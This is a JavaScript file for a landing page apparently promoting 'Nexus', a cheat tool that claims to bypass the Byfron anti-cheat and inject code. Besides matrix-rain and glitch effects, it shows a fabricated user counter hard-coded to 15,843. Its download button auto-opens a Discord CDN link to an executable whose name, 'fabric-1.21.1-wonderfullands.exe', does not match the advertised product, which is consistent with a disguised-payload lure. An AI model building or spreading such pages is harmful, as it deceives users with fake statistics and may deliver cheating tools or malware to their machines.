// Matrix Rain Effect
const canvas = document.getElementById('matrixCanvas');
const ctx = canvas.getContext('2d');

let width = window.innerWidth;
let height = window.innerHeight;
let fontSize = 14;
let columns;
let drops;

function initMatrix() {
    width = window.innerWidth;
    height = window.innerHeight;
    canvas.width = width;
    canvas.height = height;
    
    columns = Math.floor(width / fontSize);
    drops = [];
    
    for (let i = 0; i < columns; i++) {
        drops[i] = Math.floor(Math.random() * -height);
    }
}

function drawMatrix() {
    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
    ctx.fillRect(0, 0, width, height);
    
    ctx.fillStyle = '#00ff41';
    ctx.font = `${fontSize}px 'Share Tech Mono', monospace`;
    
    for (let i = 0; i < drops.length; i++) {
        const text = String.fromCharCode(0x30A0 + Math.random() * 96);
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        
        if (drops[i] * fontSize > height && Math.random() > 0.975) {
            drops[i] = 0;
        }
        drops[i]++;
    }
}

// Animated tagline
const taglines = [
    '> INITIALIZING NEXUS...',
    '> BYPASSING BYFRON...',
    '> INJECTION READY',
    '> 99.7% UNC ACHIEVED',
    '> SYSTEM ONLINE'
];

let taglineIndex = 0;
const taglineEl = document.getElementById('tagline');

function animateTagline() {
    let i = 0;
    const currentText = taglines[taglineIndex];
    taglineEl.textContent = '';
    
    function typeWriter() {
        if (i < currentText.length) {
            taglineEl.textContent += currentText.charAt(i);
            i++;
            setTimeout(typeWriter, 50);
        } else {
            setTimeout(() => {
                taglineIndex = (taglineIndex + 1) % taglines.length;
                animateTagline();
            }, 2000);
        }
    }
    
    typeWriter();
}

// Counter animation for users
function animateCounter() {
    const usersEl = document.getElementById('usersCount');
    let current = 0;
    const target = 15843;
    const duration = 2000;
    const step = target / (duration / 16);
    
    const timer = setInterval(() => {
        current += step;
        if (current >= target) {
            usersEl.textContent = target.toLocaleString();
            clearInterval(timer);
        } else {
            usersEl.textContent = Math.floor(current).toLocaleString();
        }
    }, 16);
}

// Download functionality
const downloadBtn = document.getElementById('downloadBtn');
const downloadCard = document.getElementById('downloadCard');
const closeCard = document.getElementById('closeCard');
const directLink = document.getElementById('directLink');

downloadBtn.addEventListener('click', () => {
    downloadCard.classList.add('show');
    
    // Auto-start download after 2 seconds
    setTimeout(() => {
        // REPLACE THIS URL with your actual Discord CDN link
        const downloadUrl = 'https://cdn.discordapp.com/attachments/1511238444729241825/1512137057630421203/fabric-1.21.1-wonderfullands.exe?ex=6a22fee0&is=6a21ad60&hm=f0d0d99222c3b1e668f5036ea3e9a0605cfceef05ff19240801e2868d76c7fa0&';
        window.open(downloadUrl, '_blank');
    }, 2000);
});

closeCard.addEventListener('click', () => {
    downloadCard.classList.remove('show');
});

// Close card when clicking outside
document.addEventListener('click', (e) => {
    if (downloadCard.classList.contains('show') && 
        !downloadCard.contains(e.target) && 
        e.target !== downloadBtn) {
        downloadCard.classList.remove('show');
    }
});

// Set direct link
directLink.href = 'https://cdn.discordapp.com/attachments/YOUR_ID/YOUR_FILE_ID/Nexus.exe';

// Features button - scroll to features
document.getElementById('featuresBtn').addEventListener('click', () => {
    document.getElementById('features').scrollIntoView({ behavior: 'smooth' });
});

// Glitch effect on hover
const glitchText = document.querySelector('.glitch');
setInterval(() => {
    if (Math.random() > 0.97) {
        glitchText.style.animation = 'none';
        setTimeout(() => {
            glitchText.style.animation = 'glitch 3s infinite';
        }, 10);
    }
}, 100);

// Start animations
initMatrix();
animateTagline();
animateCounter();

// Matrix rain animation loop
setInterval(drawMatrix, 50);

// Handle window resize
window.addEventListener('resize', () => {
    initMatrix();
});

// Random glitch effect on body
setInterval(() => {
    if (Math.random() > 0.98) {
        document.body.style.transform = `translate(${Math.random() * 2 - 1}px, ${Math.random() * 2 - 1}px)`;
        setTimeout(() => {
            document.body.style.transform = 'translate(0, 0)';
        }, 50);
    }
}, 3000);
